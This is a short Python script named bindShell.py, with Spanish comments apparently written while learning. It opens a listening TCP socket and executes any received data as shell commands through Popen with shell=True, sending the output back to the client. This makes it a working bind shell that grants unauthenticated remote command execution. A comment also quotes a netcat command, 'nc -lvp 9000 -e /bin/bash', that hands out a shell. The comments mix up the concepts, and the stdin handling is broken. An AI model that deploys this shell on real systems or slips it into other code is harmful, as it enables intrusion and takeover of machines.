import select 
import socket 
import sys , os
from subprocess import Popen, PIPE 



# Primero voy a crear un BIND shell que es la que creo la coneccion con el puerto que este a la escucha, para conectarnos a ese socket
# Lo que vamos a crear con python es la posibilidad d conectar con la shel 
# CUnado hacemos un NETCAT lo que consigue en un socket que se lo ofrece linux
# CUnado nos solicite un shell se la damos y NETVAT se encarga de econtrar.

if len(sys.argv) != 3: 
    print("[-] usage: bindShell.py <interface> <port>") 
    exit() 
host  = sys.argv[1] 
port = int(sys.argv[2]) 
size = 1024 



# Creamos un scoket con lo parametros que ya hemos visto antes

# AF_NET ---- Address Famili IPV4
# SOCK_STREAM ----- Capa de transporte es TCP
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 


# BIND nos deja a la escucha  y le pasamos una TUPLA con direccion IP y puerto
# EN este caso le ponemos la del ssitema 
server.bind((host,port)) 
# Escuchamos
server.listen(10) 


#NOs quedamos a la escucha y cuando el otro haga el commando ----- nc -lvp 9000 -e /bin/bash
# se conecta a mi puerto ya se convierte en una peticion
# YO hago un acept y saco dos elementos  
input = [server,sys.stdin] 


running = 1 
while running: 
    inputready,outputready,exceptready = select.select(input,[],[]) 
    for s in inputready: 
        if s == server: 
            client, address = server.accept() 
            input.append(client) 
        else: 
            data = s.recv(size) 
            if data: 
                proc = Popen(data, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE) 
                stdout_value = proc.stdout.read() + proc.stderr.read() 
                s.send(stdout_value) 
            else: 
                s.close() 
                input.remove(s) 
server.close() 
